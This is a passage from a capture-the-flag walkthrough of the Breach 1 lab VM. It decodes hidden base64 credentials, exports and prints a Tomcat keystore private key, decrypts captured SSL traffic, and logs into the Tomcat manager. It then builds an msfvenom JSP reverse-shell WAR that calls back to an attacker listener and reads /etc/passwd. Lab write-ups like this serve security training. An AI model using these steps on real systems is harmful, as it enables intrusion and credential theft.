</span><span class='line'>&lt;li&gt;End Time:           2016-11-27 14:36:45 <span class="o">(</span>GMT11<span class="o">)</span> <span class="o">(</span><span class="m">21</span> seconds<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>Here is a directory found <code>/images/</code>.</p>

<p><img class="left" src="/downloads/Breach1/2.png"></p>

<p>Download all the pictures and checked them by using <code>exiftool</code>, found one comment <code>coffeestains</code> in file <code>bill.png</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1/images# exiftool * <span class="p">|</span> grep -i -e <span class="p">&amp;</span>lsquo<span class="p">;</span>File Name<span class="p">&amp;</span>rsquo<span class="p">;</span> -e <span class="p">&amp;</span>lsquo<span class="p">;</span>Comment<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'>File Name                       : bill.png
</span><span class='line'>Comment                         : coffeestains
</span><span class='line'>File Name                       : cake.jpg
</span><span class='line'>File Name                       : initech.jpg
</span><span class='line'>File Name                       : milton_beach.jpg
</span><span class='line'>File Name                       : swingline.jpg
</span><span class='line'>File Name                       : troll.gif
</span></code></pre></td></tr></table></div></figure></p>

<p>Took a note here, for now.</p>

<p>By checking the source code as follow, I noticed that there is a page called <code>initech.html</code> and some encoded text (looks like base64 encoded) in the comment.</p>

<p><img class="left" src="/downloads/Breach1/3.png"></p>

<p>After decoded twice of the string <code>Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</code>, I got the plaintext: <code>pgibbons:damnitfeel$goodtobeagang$ta</code> which highly possible to be a pair of username and password divided by <code>:</code>.</p>

<p>Take a note here, the username is <font color='red'><code>pgibbons</code></font> and the password is <font color='red'><code>damnitfeel$goodtobeagang$ta</code></font>.</p>

<p>Then moving on to the new page <code>initech.html</code>.</p>

<p><img class="left" src="/downloads/Breach1/4.png"></p>

<p><code>Employee portal</code> just outstanding on the menu, so heading into it and using the username and password found before, bingo!!</p>

<p>After get in, there are 3 new emails in the mailbox.</p>

<p><img class="left" src="/downloads/Breach1/5.png"></p>

<p>Got something suspectable In the 3rd message, and download the secret file <code>.keystore</code>.</p>

<p><img class="left" src="/downloads/Breach1/6.png"></p>

<p>Keep note here, and then search <code>ssl</code> in order to find more information about the new SSL certificate, and I got another message which disclosed a <code>pcap</code> file link, also the storepassword and keypassword are all set to <font color='red'><code>tomcat</code></font>.</p>

<p><img class="left" src="/downloads/Breach1/7.png"></p>

<p>Now downloaded the <code>pcap</code> file and opened it using wireshark, all the TCP stream is encrypted, so I need to import a certificate to decrypt.</p>

<p>Then I decided to back to the <code>.keystore</code> file and searched online, got that is tomcat certificate keystore file. Using <code>keytool</code> and the password <code>tomcat</code> to check it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# keytool -list -v -keystore keystore
</span><span class='line'>Enter keystore password:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Keystore <span class="nb">type</span>: JKS
</span><span class='line'>Keystore provider: SUN&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Your keystore contains <span class="m">1</span> entry&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Alias name: tomcat
</span><span class='line'>Creation date: May 21, 2016
</span><span class='line'>Entry <span class="nb">type</span>: PrivateKeyEntry
</span><span class='line'>Certificate chain length: 1
</span><span class='line'>Certificate&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://stackoverflow.com/questions/2640691/how-to-export-private-key-from-a-keystore-of-self-signed-certificate&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Export private key from keystore file&quot;</span>&gt;1&lt;/a&gt;:
</span><span class='line'>Owner: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
</span><span class='line'>Issuer: <span class="nv">CN</span><span class="o">=</span>Unknown, <span class="nv">OU</span><span class="o">=</span>Unknown, <span class="nv">O</span><span class="o">=</span>Unknown, <span class="nv">L</span><span class="o">=</span>Unknown, <span class="nv">ST</span><span class="o">=</span>Unknown, <span class="nv">C</span><span class="o">=</span>Unknown
</span><span class='line'>Serial number: 60856e88
</span><span class='line'>Valid from: Sat May <span class="m">21</span> 03:51:07 AEST <span class="m">2016</span> <span class="k">until</span>: Fri Aug <span class="m">19</span> 03:51:07 AEST 2016
</span><span class='line'>Certificate fingerprints:
</span><span class='line'>     MD5:  C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0
</span><span class='line'>     SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53
</span><span class='line'>     SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31
</span><span class='line'>     Signature algorithm name: SHA256withRSA
</span><span class='line'>     Version: 3&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Extensions:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;1: ObjectId: 2.5.29.14 <span class="nv">Criticality</span><span class="o">=</span><span class="nb">false</span>&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;SubjectKeyIdentifier <span class="o">[</span>
</span><span class='line'>KeyIdentifier <span class="o">[</span>
</span><span class='line'>0000: <span class="m">47</span> 6B A3 <span class="m">37</span> ED A5 1F 0A   0D <span class="m">61</span> CA AA <span class="m">17</span> 9C F4 8C  Gk.7<span class="p">&amp;</span>hellip<span class="p">;</span>..a<span class="p">&amp;</span>hellip<span class="p">;&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>0010: <span class="m">10</span> <span class="m">64</span> <span class="m">87</span> DF                                        .d..
</span><span class='line'><span class="o">]</span>
</span><span class='line'><span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@kali:~/myExercises/breach1#
</span></code></pre></td></tr></table></div></figure></p>

<p>Then trying to extract private key from the <code>keystore</code> <a href="http://stackoverflow.com/questions/2640691/how-to-export-private-key-from-a-keystore-of-self-signed-certificate" title="Export private key from keystore file">file</a>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12
</span><span class='line'>Enter destination keystore password:&lt;br/&gt;
</span><span class='line'>Re-enter new password:
</span><span class='line'>Enter <span class="nb">source </span>keystore password:&lt;br/&gt;
</span><span class='line'><span class="o">[</span>Storing myp12file.p12<span class="o">]</span>
</span><span class='line'>root@kali:~/myExercises/breach1# ls
</span><span class='line'>keystore  myp12file.p12  _SSL_test_phase1.pcap
</span></code></pre></td></tr></table></div></figure></p>

<p>check the private key:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/breach1# openssl pkcs12 -in myp12file.p12 -nocerts -nodes
</span><span class='line'>Enter Import Password:
</span><span class='line'>MAC verified OK
</span><span class='line'>Bag Attributes
</span><span class='line'>    friendlyName: tomcat
</span><span class='line'>    localKeyID: <span class="m">54</span> <span class="m">69</span> 6D <span class="m">65</span> <span class="m">20</span> <span class="m">31</span> <span class="m">34</span> <span class="m">38</span> <span class="m">30</span> <span class="m">31</span> <span class="m">34</span> <span class="m">34</span> <span class="m">33</span> <span class="m">35</span> <span class="m">37</span> <span class="m">32</span> <span class="m">36</span> 35
</span><span class='line'>Key Attributes: &lt;No Attributes&gt;
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>BEGIN PRIVATE KEY<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>
</span><span class='line'>MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCjJXnELHvCEyTT
</span><span class='line'>ZW/cJb7sFuwIUy5l5DkBXD9hBgRtpUSIv9he5RbJQwGuwyw5URbm3pa7z1eoRjFW
</span><span class='line'>HLMVzKYte6AyyjUoWcc/Fs9fiu83+F0G36JmmFcxLFivVQwCHKhrajUc15i/XtCr
</span><span class='line'>ExEDNL0igM8YnCPq4J9lXrXUanLltR464F7cJdLbkqHiqRvoFiOQi9e3CIZ86uoY
</span><span class='line'>UNBupj2/njMFRuB7dEoeaQ/otHZIgCgjbP76I+/xyL/RkGxYuU0e1tpQiLxTi7kF
</span><span class='line'>nJ1Rd55Gd+DvzuBiI9F+fxa4+TSQvRvQEzJIKowbPw6h82Cd66yFju8c2AKiaDie
</span><span class='line'>F+AqVim3AgMBAAECggEBAIr2Ssdr1GY0hDODvUnY5MyXoahdobGsOVoNRvbPd0ol
</span><span class='line'>cUDBl/0MSOJZLr+7Apo3lbhEdEO4kkOEtlVQ0MGKtSkcmhFo5updvjbgqPYKk0Qr
</span><span class='line'>SqGmLuAQdoQt78Q4Pqg13MbRijfs8/BdRIPTE7SVYVxYNw4RQQ65EUv45gvuN7ur
</span><span class='line'>shV5WSHVaN5QyUHyOTKcvFuBqxb9Mfo2NtRGZCG2QuG8V/C+k2k8+Q+n2wDaOXw8
</span><span class='line'>sIWKVMHngOMcW1OBnM3ac/bTeI2+LI5cMsBZqYlLmkH1AOlnCgpH7389NbRQQJSo
</span><span class='line'>sExX51v5r2mmI1JdzszwQYqRfH7+nugDRjBEN2ztqFECgYEA4eBiLFP9MeLhjti8
</span><span class='line'>PDElSG4MVf/I9WXfLDU79hev7npRw8LE0rzPgawXOL8NhTbp8/X1D071bGaA3rCU
</span><span class='line'>oBEEPclXlSwXHroZVjJALDhaPrIfFT6gBXlb9wAYSzWYED4LKXDuddVChrTo4Lmx
</span><span class='line'>XaHb/KM7kpPuUWr+xccEEuNJBnMCgYEAuOduxGz2Ecd+nwATsZpjgG5/SwLL/rd0
</span><span class='line'>TEMNQbB/XUIOI8mZpw5Dn1y71qCijk/A+oVzohc6Dspso4oXLMy0b+HCFPTKuGgg
</span><span class='line'>Hf8QV5YbDg0urH8KNNEEH7Dx/C6cp6vVAcj6eQ2wOwW62yVY8gy2elWH0gte1BXl
</span><span class='line'>hHiKIaLueq0CgYEAoAwi4+/7Ny7gzhvKfQgBt+mqOgGM/jzZvnRV8VDlayAm8YP/
</span><span class='line'>fKcmjWZH6gCN7vdzHFcJ9nfnNJEI/UG3fhewnqscsOlV1ILe0xG2IN8pKsWBescu
</span><span class='line'>EdLlFAZwMFJgVhnwRMPtY3bhtZtYa2uIPqUiwEdVPc4uDmi276LNwyhjJPsCgYA7
</span><span class='line'>ANcO5TpMiB12vX6LURnpVNlX5WeVO5Nn9omXaavq5XY/o0hdz6ZyhxQFtDLLONX6
</span><span class='line'>23T/x2umZp/uO9WTXStC/IaDS24ZFFkTWV4spOCzRi+bqdpm6j/noP5HG9SviJyr
</span><span class='line'>Oif7Uwvmebibz7onWzkrpnl15Fz5Tpd0A0cI3sY87QKBgQDLZ9pl505OMHOyY6Xr
</span><span class='line'>geszoeaj4cQrRF5MO2+ad81LT3yoLjZyARaJJMEAE7FZxPascemlg9KR3JPnevIU
</span><span class='line'>3RdMGHX75yr92Sd8lNQvSO6RWUuRnc889xN1YrpPx5G1VppIFqTrcB0gAiREkeUA
</span><span class='line'>pHiPhbocjixKJz9xx+pG0jDkrg<span class="o">==</span>
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>END PRIVATE KEY<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>
</span><span class='line'>root@kali:~/myExercises/breach1#
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I will <a href="https://support.citrix.com/article/CTX116557" title="Decrypt SSL/TLS Traffic using wireshark">import the Private key file</a> into <code>wireshark</code> in order to decrypt the SSL stream.</p>

<p><img class="left" src="/downloads/Breach1/8.png"></p>

<p>After imported the private key, I have to re-open the <code>pcap</code> file in wireshark, now the traffic is quite clear, then right click in wireshark and choose <code>Follow</code> &ndash;> <code>SSL Stream</code> to read the traffic clearly.</p>

<p><img class="left" src="/downloads/Breach1/9.png"></p>

<p>From here, got a HTTP Basic login credential in base64 encoded: <code>dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code>.</p>

<p>After decoded it, i got the plaintext: <code>tomcat:Tt\5D8F(#!*u=G)4m7zB</code>, which username is <font color='red'><code>tomcat</code></font> and password is <font color='red'><code>Tt\5D8F(#!*u=G)4m7zB</code></font>.</p>

<p>And based on the first two lines above, the login URL should be <font color='red'><code>https://192.168.110.140:8443/_M@nag3Me/html</code></font>.</p>

<p>[<font color='red'>Note</font>] Here I could not load the page correctly via firefox directly, but when I use <code>burp proxy</code> as a proxy, I was able to add exception in the firefox to access the tomcat page.</p>

<p><img class="left" src="/downloads/Breach1/10.png"></p>

<p>Now I got in, from here, I could generate and upload an evil <code>.WAR</code> file or use metasploit to exploit automatically.</p>

<p>Using <code>msfvenom</code> to generate a WAR webshell by following commond [3]:</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=443 -f war &gt; shell.war</code></p>

<p>Then setup <code>msfconsole</code> to listen on and got a reverse shell back as soon as I triggerred.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>smsf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; show options&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name  Current Setting  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Payload options <span class="o">(</span>java/jsp_shell_reverse_tcp<span class="o">)</span>:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Name   Current Setting  Required  Description&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   LHOST  192.168.110.129  yes       The listen address
</span><span class='line'>   LPORT  <span class="m">443</span>              yes       The listen port
</span><span class='line'>   SHELL                   no        The system shell to use.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Exploit target:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   Id  Name&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="m">0</span>   Wildcard Target&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>&lt;em&gt;<span class="o">]</span> Started reverse TCP handler on 192.168.110.129:443
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Starting the payload handler<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">4</span> opened <span class="o">(</span>192.168.110.129:443 -&gt; 192.168.110.140:37620<span class="o">)</span> at 2016-11-27 14:17:25 +1100&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>104<span class="o">(</span>tomcat6<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>112<span class="o">(</span>tomcat6<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>112<span class="o">(</span>tomcat6<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! got in. However, after spended couple of hours looking around in the system, I could not get any further.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home/milton<span class="nv">$ </span>s -al
</span><span class='line'>ls -al
</span><span class='line'>total 156
</span><span class='line'>drwxr-xr-x <span class="m">3</span> milton milton   <span class="m">4096</span> Jun  <span class="m">6</span> 15:34 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root   root     <span class="m">4096</span> Jun  <span class="m">4</span> 19:24 ..
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> milton milton    <span class="m">234</span> Jun <span class="m">11</span> 18:15 .bash_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> milton milton    <span class="m">220</span> May <span class="m">20</span>  <span class="m">2016</span> .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> milton milton   <span class="m">3637</span> May <span class="m">20</span>  <span class="m">2016</span> .bashrc
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> milton milton   <span class="m">4096</span> May <span class="m">20</span>  <span class="m">2016</span> .cache
</span><span class='line'>-rw-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> milton milton   <span class="m">2245</span> May <span class="m">20</span>  <span class="m">2016</span> .keystore
</span><span class='line'>-rw-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> milton milton <span class="m">111255</span> Jun  <span class="m">4</span> 18:46 my_badge.jpg
</span><span class='line'>-rw<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>- <span class="m">1</span> milton milton    <span class="m">407</span> Jun  <span class="m">4</span> 18:18 .mysql_history
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> milton milton    <span class="m">675</span> May <span class="m">20</span>  <span class="m">2016</span> .profile
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root   root       <span class="m">66</span> Jun  <span class="m">4</span> 10:57 .selected_editor
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> milton milton    <span class="m">755</span> Jun  <span class="m">4</span> 10:51 some_script.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;tomcat6@Breach:/home/milton<span class="nv">$ </span>cat some_script.sh
</span><span class='line'>cat some_script.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="p">|</span>&lt;em&gt;   &lt;/em&gt;<span class="p">|</span> <span class="p">|</span>                 <span class="o">(</span> <span class="o">)</span>                 <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>   <span class="o">(</span>&lt;em&gt;<span class="o">)</span>             <span class="p">|</span> <span class="p">|</span>                &lt;br/&gt;
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>&lt;strong&gt;   &lt;/strong&gt;&lt;/em&gt; _ &lt;strong&gt; &lt;/strong&gt;&lt;em&gt;<span class="p">|</span>/ &lt;/em&gt;&lt;strong&gt;   _ &lt;/strong&gt;   &lt;strong&gt;&lt;em&gt; <span class="p">|</span> <span class="p">|</span>&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;/strong&gt;  _ _ &lt;strong&gt;   &lt;/strong&gt; _  <span class="p">|</span> <span class="p">|</span>&lt;strong&gt;   &lt;/strong&gt;&lt;em&gt; _ &lt;strong&gt; &lt;/strong&gt;&lt;/em&gt;
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;em&gt; <span class="se">\ </span>/ _ <span class="se">\ </span><span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;strong&gt;/ _ <span class="se">\ </span>/ &lt;/strong&gt;<span class="p">|</span> <span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ _ <span class="p">|</span> &lt;strong&gt;<span class="p">|</span> <span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;em&gt; <span class="p">|</span> <span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ &lt;em&gt;<span class="sb">`</span> <span class="p">|</span> <span class="p">|</span> <span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ _ <span class="se">\ </span><span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/strong&gt;/ _ <span class="se">\</span>
</span><span class='line'>  <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  &lt;strong&gt;/ <span class="p">|</span> <span class="p">|</span>  &lt;/strong&gt;/ _&lt;em&gt; <span class="se">\ </span><span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>&lt;/em&gt;<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>&lt;em&gt;<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>&lt;/em&gt;<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  &lt;strong&gt;/ <span class="p">|</span> <span class="p">|</span>  &lt;/strong&gt;/
</span><span class='line'>  _/ <span class="p">|</span>&lt;em&gt;<span class="p">|</span> <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>_&lt;strong&gt;<span class="p">|</span>_<span class="p">|</span>  _&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;em&gt;/ <span class="p">|</span>&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>_&lt;/strong&gt;/ _&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span> <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>_&lt;em&gt;, <span class="p">|</span> <span class="p">|</span>&lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;em&gt;<span class="p">|</span>___<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>  _&lt;strong&gt;<span class="p">|</span>
</span><span class='line'>                                                                  &lt;/strong&gt;/ <span class="p">|</span>                    &lt;br/&gt;
</span><span class='line'>                                                                 <span class="p">|</span>___/&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>I found that account <code>blumbergh</code> is owned by <code>Bill Lumbergh</code> when I was checking the file <code>/etc/passwd</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>tomcat6@Breach:/home<span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
